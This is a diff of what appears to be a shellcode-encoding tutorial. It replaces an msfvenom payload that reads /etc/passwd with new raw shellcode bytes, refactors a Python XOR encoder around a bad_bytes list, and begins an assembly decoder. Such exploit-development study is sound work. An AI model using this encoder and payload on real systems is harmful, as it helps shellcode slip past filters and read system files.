@@ -20,7 +20,7 @@ This results in the following shellcode:
 
 # Encoding: Python
 
-The python script that will do the encoding is below:
+My python script that will do the encoding is below:
 
 ```python
 #!/bin/python3
@@ -29,7 +29,9 @@ import binascii
 
 
 # msfvenom -p linux/x86/read_file -f c PATH=/etc/passwd  -b '\x00'
-payload = b"\xdd\xc1\xbf\x50\xc4\x41\xa4\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x13\x31\x7a\x18\x03\x7a\x18\x83\xc2\x54\x26\xb4\x4f\x62\x1e\x32\x90\x8a\x5e\x66\xa1\x43\x93\x18\x48\x90\x94\x1a\x4b\x16\xe5\x95\xac\x9f\x1c\x1f\x32\x8f\xde\x60\xfe\x2f\x57\xa2\xb8\x2b\x68\x23\xb9\x88\x69\x23\xb9\xee\xa4\xa3\x01\xef\x36\xa4\x71\x54\x36\xa4\x71\xaa\xfa\x24\x99\x6f\xfb\xda\xa5\x40\x61\x51\x39\xb1\x19\xf8\xce\xbe\xae\x9e\x30"
+payload = b"\xbe\xd4\xa1\x45\x1e\xda\xc1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x13\x31\x75\x13\x83\xed\xfc\x03\x75\xdb\x43\xb0\xf5\xd5\x3b\x3e\x0a\x19\x3c\x1a\x3b\xd0\xf1\x1c\xb2\x21\xb1\x1e\xc5\xa5\xc2\xa9\x22\x2c\x3b\x13\xac\x3e\xbc\x64\x60\xbe\x35\xa6\xc2\xba\x45\x27\x33\x79\x44\x27\x33\x7d\x8a\xa7\x8b\x7c\x14\xa8\xeb\xc5\x14\xa8\xeb\x39\xd8\x28\x03\xfc\x1d\xd7\x2b\xd1\x84\x5c\xb7\x02\x37\xfc\x44\x2f\xc0\x9a\xaa"
+
+bad_bytes = [ 0xff, 0x00 ]
 
 output = ""
 for b in payload:
@@ -41,7 +43,7 @@ for b in payload:
         new_shellcode_byte = b ^ int.from_bytes(rand_byte, 'little')
 
         # check if new shellcode will contatin 0xff or 0x00    
-        if not rand_byte == 0xff and not new_shellcode_byte == 0xff and not rand_byte == 0x00 and not new_shellcode_byte == 0x00:
+        if not rand_byte in bad_bytes and not new_shellcode_byte in bad_bytes:
             break
         print("FOUND 0xFF or 0x00 in rand_byte or new_shellcode_byte, generating new random byte!!")
         
@@ -62,11 +64,9 @@ This script accepts the original shellcode in the `payload` variable. It then it
 
 The new shellcode will be in the form of `<random_byte><old_byte ^ random_byte>`. 
 
-If either of these bytes are a `0x00` or `0xff`, a new random byte is generated and the old shellcode is xor'd with the new random byte. This is to avoid `0x00` in the new payload and `0xff` which will be appended as the exit condition during decoding.
+If either of these bytes are a `0x00` or `0xff`, a new random byte is generated and the old shellcode is xor'd with the new random byte. This is to avoid `0x00` in the new payload and `0xff` which will be appended as the exit condition during decoding. Additionally, a `bad_bytes` array is used, thus it is trivial to add additional bad characters you would like to avoid in the final shellcode (note that 0xff is required as it is the exit condition).
 
 # Decoder: Assembly
-
-
 
 ```assembly
 ; Filename: custom_decode.nasm
